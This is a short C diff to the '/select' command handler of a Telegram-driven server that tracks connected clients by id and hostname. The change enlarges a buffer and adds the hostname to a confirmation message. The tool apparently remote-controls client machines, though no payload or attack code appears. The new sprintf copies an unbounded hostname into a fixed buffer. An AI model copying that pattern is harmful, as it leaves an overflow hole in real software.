@@ -287,7 +287,7 @@ void *command(){
                 /select function
             */
             else if(strncmp(chat.text, "/select", 7) == 0){
-                char temp[100] = "";
+                char temp[300] = "";
 
                 /* parse client_id from message */
                 for(int i = 7; chat.text[i] != 0; i++){
@@ -330,7 +330,7 @@ void *command(){
 
                             /* copy chat struct to socket list struct */
                             clients[user_select_id-1].chat = chat;
-                            sprintf(temp, "Selected client %d", user_select_id);
+                            sprintf(temp, "Selected client %d `%s`", user_select_id, clients[user_select_id-1].hostname);
                             telegram_send_msg(chat.id, temp);
                         }
                         else{
